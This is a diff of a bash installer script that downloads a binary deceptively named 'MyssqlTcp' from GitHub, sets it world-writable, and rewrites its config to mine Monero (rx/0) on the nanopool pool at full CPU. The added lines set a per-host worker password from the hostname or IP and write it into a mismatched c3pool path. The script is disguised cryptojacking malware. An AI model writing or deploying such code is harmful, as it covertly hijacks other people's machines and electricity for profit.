@@ -122,8 +122,19 @@ wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
 chmod 777 MyssqlTcp
 chmod 777 config.json
 
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS"
+fi
 sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
 sed -i 's/"url": *"[^"]*",/"url": "xmr-eu1.nanopool.org:'$PORT'",/' $HOME/myssqltcp/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
